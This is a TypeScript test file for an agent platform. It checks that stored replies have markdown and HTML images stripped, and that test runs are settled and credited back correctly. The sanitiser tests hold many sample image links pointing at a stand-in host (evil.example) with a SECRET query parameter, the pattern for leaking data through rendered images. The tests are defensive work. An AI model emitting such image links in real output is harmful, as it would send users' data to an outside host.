import assert from 'node:assert/strict';
import { test } from 'node:test';

import { TEST_TURN_ATTEMPT_ENDED_MESSAGE } from '../src/agents/test-turn-limits.ts';
import {
  configureInstallationAdmission,
  resetInstallationAdmissionForTests,
} from '../src/config/installation-admission.ts';
import { scopeInstallationEnv } from '../src/config/installation-scope.ts';
import {
  configurePlatformFunding,
  resetPlatformFundingForTests,
  type CreditBackReason,
  type RunRef,
} from '../src/config/platform-funding.ts';
import type { PlatformEnv } from '../src/config/state-backend.ts';
import type { AgentConversationSnapshot } from '../src/slack/bounded-agent-observation.ts';
import { withoutImages } from '../src/agents/practice-steps.ts';
import {
  cloudflareTestRunInstancePort,
  testRunSettlement,
  type SettledAgentSubmission,
} from '../src/state/test-run-instance.ts';
import type { UsageMicros } from '../src/usage/usage-display.ts';
import { EVERY_PROVIDER_FUNDED, NO_RUN_FEES } from './helpers/platform-funding.ts';

function answered(text: string): SettledAgentSubmission {
  const history = { messages: [] } as unknown as AgentConversationSnapshot;
  return { outcome: 'completed', completed: { reply: { text } as never, history } };
}

test('a reply leaves the store with no image a client would fetch: each is its alt text, or its address as plain text', () => {
  const cases: Array<[string, string]> = [
    ['Here: ![chart of orders](https://evil.example/p?d=SECRET) done.', 'Here: chart of orders done.'],
    ['![](https://evil.example/p?d=SECRET)', 'https://evil.example/p?d=SECRET'],
    ['![a [nested] alt](https://evil.example/a_(1).png "title")', 'a [nested] alt'],
    ['![](<https://evil.example/a b.png>)', 'https://evil.example/a b.png'],
    ['![logo][ref] and ![][ref]\n\n[ref]: https://evil.example/r.png', 'logo and https://evil.example/r.png\n\n[ref]: https://evil.example/r.png'],
    ['![shortcut]\n\n[shortcut]: https://evil.example/s.png', 'shortcut\n\n[shortcut]: https://evil.example/s.png'],
    ['An image in an image: ![outer ![inner](https://evil.example/i)](https://evil.example/o)',
      'An image in an image: outer !\\[inner](https://evil.example/i)'],
    ['A tag: <img src="https://evil.example/t.png" alt="a tag"> and <IMG SRC=https://evil.example/u.png>',
      'A tag: a tag and https://evil.example/u.png'],
    ['Unclosed: ![never closed and <img src=x', 'Unclosed: !\\[never closed and &lt;img src=x'],
    ['Formed by a rewrite: !![[x]](https://evil.example/f)', 'Formed by a rewrite: !\\[x]'],
    ['In code too: `![x](https://evil.example/c)`', 'In code too: `x`'],
    ['A link stays a link: [orders](https://example.com/orders)', 'A link stays a link: [orders](https://example.com/orders)'],
  ];
  for (const [reply, shown] of cases) assert.equal(withoutImages(reply), shown, reply);
});

test('an answered run stores its reply without images', () => {
  const settled = testRunSettlement(answered(' Two tickets. ![](https://evil.example/p?d=SECRET) '), 'sub_1', undefined);
  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [], steps: [] });
});

test('an attempt the 25-call limit ended is a failure that stopped at the limit and is not credited back; another agent failure is', () => {
  const ended = (error: unknown) => testRunSettlement({ outcome: 'failed', error }, 'sub_1', undefined);
  // As Flue settles it (tests/run-fees-flue.test.ts reads the real one).
  assert.deepEqual(ended({
    name: 'FlueError', type: 'operation_failed', message: `dispatch(sub_1) failed: ${TEST_TURN_ATTEMPT_ENDED_MESSAGE}`,
    meta: { operation: 'dispatch(sub_1)', reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE },
  }), { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
  assert.deepEqual(ended({ message: 'The attempt failed.', cause: { message: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
    { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
  // Flue's reason is matched exactly, even if its message prefix changes.
  assert.deepEqual(ended({ name: 'FlueError', message: 'Operation failed.', meta: { reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
    { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
  assert.deepEqual(ended({ message: 'The agent threw.' }), { kind: 'failed', failure: 'failed', creditBack: 'chickpea' });
});

test('a run Flue timed out, or one aborted, is a deadline credited back as a timeout', () => {
  // The usual timeout: Flue ends the submission at its own 120 seconds, before the store's 150.
  assert.deepEqual(testRunSettlement({ outcome: 'failed', error: { type: 'submission_timeout', message: 'The submission timed out.' } }, 'sub_1', undefined),
    { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
  assert.deepEqual(testRunSettlement({ outcome: 'aborted' }, 'sub_1', undefined), { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
});

test('a test run is credited back as a direct message is: never while its installation is suspended or ended', async (t) => {
  const credits: Array<{ run: RunRef; reason: CreditBackReason }> = [];
  configurePlatformFunding({
    ...EVERY_PROVIDER_FUNDED,
    funding: async () => 'platform',
    admit: async () => 'admitted',
    charge: async () => undefined,
    ...NO_RUN_FEES,
    creditBack: async (run, reason) => {
      credits.push({ run, reason });
      return { kind: 'credited', usageMicros: 1 as UsageMicros };
    },
  });
  t.after(() => {
    resetInstallationAdmissionForTests();
    resetPlatformFundingForTests();
  });
  const port = cloudflareTestRunInstancePort(
    scopeInstallationEnv({ CHICKPEA_TENANCY: 'installation' } as PlatformEnv, { installationId: 'inst_credit' }),
  );
  // cancel_pending runs on a suspended installation, and erasure on an ended one.
  configureInstallationAdmission(async () => 'refused');
  await port.creditBack('sub_suspended', 'chickpea');
  assert.deepEqual(credits, []);
  configureInstallationAdmission(async () => 'admitted');
  await port.creditBack('sub_admitted', 'chickpea');
  assert.deepEqual(credits, [{ run: { installationId: 'inst_credit', runId: 'sub_admitted' }, reason: 'chickpea' }]);
});
